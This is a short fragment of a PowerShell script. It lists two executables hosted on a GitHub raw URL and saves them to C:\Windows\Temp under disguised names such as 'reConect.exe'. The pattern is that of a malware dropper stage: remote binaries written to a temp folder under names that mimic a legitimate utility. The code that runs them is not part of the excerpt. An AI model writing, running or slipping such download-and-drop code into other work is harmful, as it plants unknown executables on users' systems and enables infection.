...
$downloads = @(
    @{ URL = 'https://github.com/fosslas/users/raw/refs/heads/main/Timeless.exe'; Path = 'C:\Windows\Temp\reConect.exe' },
    @{ URL = 'https://github.com/fosslas/users/raw/refs/heads/main/timeless_new.exe'; Path = 'C:\Windows\Temp\reconnect.exe' }
)
